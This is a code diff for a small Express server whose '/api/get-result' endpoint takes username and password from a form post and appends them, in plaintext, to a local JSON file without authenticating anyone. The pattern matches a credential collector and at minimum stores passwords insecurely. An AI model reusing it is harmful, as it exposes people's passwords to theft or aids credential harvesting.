@@ -1,20 +1,17 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
-const multer = require('multer');
 const app = express();
 const PORT = 3000;
 
-// Middleware to parse multipart/form-data text fields
-const upload = multer();
-
 const JSON_FILE_PATH = path.join(__dirname, 'submissions.json');
 
-// Auto-initialize submissions database file if missing
+// Auto-initialize storage database file if missing
 if (!fs.existsSync(JSON_FILE_PATH)) {
   fs.writeFileSync(JSON_FILE_PATH, JSON.stringify([], null, 2));
 }
 
+// Middleware to read standard native HTML form post streams
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -24,11 +21,9 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Endpoint explicitly matched to your frontend fetch target
-// Remove multer parsing requirements for this block since we are utilizing standard application/json headers
+// Endpoint: Parses the standard form body payload securely sent from the client
 app.post('/api/get-result', (req, res) => {
   try {
-    // Read variables natively out of the parsed json body
     const { username, password, remember } = req.body;
 
     const newEntry = {
@@ -37,27 +32,24 @@ app.post('/api/get-result', (req, res) => {
       username: username || "",
       password: password || "",
       additional_fields: {
-        remember: remember || false
+        remember: remember === 'on'
       }
     };
 
+    // Load existing structures, append the payload, and save back to disk
     const fileData = fs.readFileSync(JSON_FILE_PATH, 'utf8');
     const entries = JSON.parse(fileData || '[]');
     entries.push(newEntry);
     fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(entries, null, 2));
 
-    // Send back a multi-compatible success footprint covering both evaluation patterns
-    return res.json({ 
-      success: true, 
-      backendData: "Data successfully processed and logged." 
-    });
+    // Fallback response page signaling successful stream completion
+    return res.send("Form data processed successfully.");
 
   } catch (err) {
     console.error("Database log failed:", err);
-    return res.status(500).json({ success: false, error: 'Internal server error processing payload' });
+    return res.status(500).send("Internal server processing error.");
   }
 });
-
 
 app.listen(PORT, () => {
   console.log(`🚀 Live development server running at: http://localhost:${PORT}`);
